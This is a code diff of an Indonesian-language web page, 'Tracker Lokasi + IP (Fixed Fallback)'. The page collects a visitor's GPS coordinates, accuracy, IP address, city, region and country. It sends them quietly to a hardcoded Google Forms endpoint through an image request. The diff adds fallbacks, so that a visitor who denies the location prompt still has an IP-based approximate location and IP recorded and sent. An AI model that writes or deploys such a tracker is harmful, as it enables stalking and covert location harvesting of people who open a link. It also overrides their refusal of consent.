@@ -2,34 +2,33 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8"/>
-  <title>Tracker Lokasi + IP</title>
+  <title>Tracker Lokasi + IP (Fixed Fallback)</title>
 </head>
 <body>
   <h2>Sedang merekam lokasi…</h2>
   <script>
     const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
     const F = {
-      lat:  'entry.336954328',
-      long: 'entry.122334606',
-      acc:  'entry.1466949585',
-      city: 'entry.1958665783',
-      reg:  'entry.1713030934',
-      id:   'entry.2142024660',
-      ip:   'entry.1095561107'
+      lat:  'entry.336954328',  // Latitude
+      long: 'entry.122334606',  // Longitude
+      acc:  'entry.1466949585', // Accuracy
+      city: 'entry.1958665783', // City
+      reg:  'entry.1713030934', // Region
+      id:   'entry.2142024660', // Country
+      ip:   'entry.1095561107'  // IP
     };
 
-    // Kirim ke Form
     function submit(params) {
+      // Kirim GET ke formResponse
       new Image().src = FORM_URL + '?' + new URLSearchParams(params);
     }
 
-    // Wrapper untuk kirim semua field
-    function sendAll(lat, lon, acc, city, reg, country, ip) {
+    function handleSubmission(lat, lon, acc, city, reg, country, ip) {
       const p = {
-        [F.lat]:  lat,
-        [F.long]: lon,
-        [F.acc]:  acc,
-        [F.ip]:   ip
+        [F.lat]:   lat,
+        [F.long]:  lon,
+        [F.acc]:   acc,
+        [F.ip]:    ip
       };
       if (city    !== undefined) p[F.city] = city;
       if (reg     !== undefined) p[F.reg]  = reg;
@@ -37,27 +36,44 @@
       submit(p);
     }
 
-    // Dipanggil kalau geolocation OK
-    function onGeoSuccess(position) {
-      const { latitude, longitude, accuracy } = position.coords;
-      // Ambil IP via ipify (CORS OK)
-      fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(d => {
-          sendAll(latitude, longitude, accuracy, undefined, undefined, undefined, d.ip);
-        })
-        .catch(() => {
-          sendAll(latitude, longitude, accuracy, undefined, undefined, undefined, 'unknown');
-        });
-    }
-
-    // Dipanggil kalau geolocation ditolak / gagal
-    function onGeoError() {
-      // Fallback ambil IP+geo aproksimasi via ipwho.is (CORS OK)
+    function onGeoSuccess(pos) {
+      const { latitude, longitude, accuracy } = pos.coords;
+      // Ambil IP sekaligus lewat ipwho.is (CORS ok)
       fetch('https://ipwho.is/json/')
         .then(r => r.json())
         .then(d => {
-          sendAll(
+          handleSubmission(
+            latitude,
+            longitude,
+            accuracy,
+            d.city,
+            d.region,
+            d.country,
+            d.ip
+          );
+        })
+        .catch(() => {
+          // Kalau ipwho.is gagal, kirim minimal data GPS + ipify
+          fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(j => handleSubmission(
+              latitude, longitude, accuracy,
+              undefined, undefined, undefined,
+              j.ip
+            ))
+            .catch(() => {
+              // Kalau semua API gagal, kirim GPS saja
+              handleSubmission(latitude, longitude, accuracy, undefined, undefined, undefined, 'unknown');
+            });
+        });
+    }
+
+    function onGeoError() {
+      // User tolak, langsung fallback aproksimasi + IP via ipwho.is
+      fetch('https://ipwho.is/json/')
+        .then(r => r.json())
+        .then(d => {
+          handleSubmission(
             d.latitude,
             d.longitude,
             'IP',
@@ -68,19 +84,19 @@
           );
         })
         .catch(() => {
-          // Jika ipwho.is juga gagal, fallback ambil IP saja
+          // Kalau ipwho.is gagal, kirim hanya IP dengan ipify
           fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
-            .then(d => {
-              sendAll(0, 0, 'error', undefined, undefined, undefined, d.ip);
-            })
+            .then(j => handleSubmission(
+              0, 0, 'error', undefined, undefined, undefined, j.ip
+            ))
             .catch(() => {
-              sendAll(0, 0, 'error', undefined, undefined, undefined, 'unknown');
+              // Kalau benar-benar gagal semua, kirim satu entry “error”
+              handleSubmission(0, 0, 'error', undefined, undefined, undefined, 'unknown');
             });
         });
     }
 
-    // Mulai tracking
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         onGeoSuccess,
